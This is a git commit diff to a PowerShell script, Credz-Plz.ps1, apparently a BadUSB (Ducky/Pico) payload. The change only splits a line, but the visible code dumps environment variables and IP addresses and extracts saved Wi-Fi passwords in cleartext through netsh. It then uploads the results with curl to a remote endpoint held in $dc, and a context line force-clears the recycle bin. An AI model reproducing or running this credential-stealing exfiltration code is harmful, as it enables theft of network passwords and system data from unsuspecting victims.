8dc1ca50815def9cc6110acb69e44da9119d6c37
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2023-12-16 19:19:37 +0100

    Update Credz-Plz.ps1

--- Credz-Plz.ps1
+++ Credz-Plz.ps1
@@ -234,7 +234,8 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #------------------------------------------------------------------------------------------------------------------------------------
 dir env: >> stats.txt
-Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt
+Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt
 $Body=@{ content = "$env:computername Stats from Ducky/Pico"}
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)
 curl.exe -F "file1=@stats.txt" $dc
